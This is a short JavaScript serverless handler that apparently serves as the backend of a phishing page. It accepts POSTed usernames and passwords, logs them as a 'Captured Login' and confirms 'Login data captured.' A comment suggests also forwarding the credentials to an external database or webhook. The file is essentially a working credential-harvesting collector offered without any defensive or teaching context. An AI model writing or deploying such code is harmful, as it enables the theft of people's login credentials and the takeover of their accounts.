exports.handler = async (event) => {
  if (event.httpMethod === "POST") {
    const { username, password } = JSON.parse(event.body);

    console.log("Captured Login:", { username, password });

    // Optionally save to external DB or send to webhook here

    return {
      statusCode: 200,
      body: JSON.stringify({ message: "Login data captured." }),
    };
  }

  return {
    statusCode: 405,
    body: JSON.stringify({ message: "Method not allowed." }),
  };
};
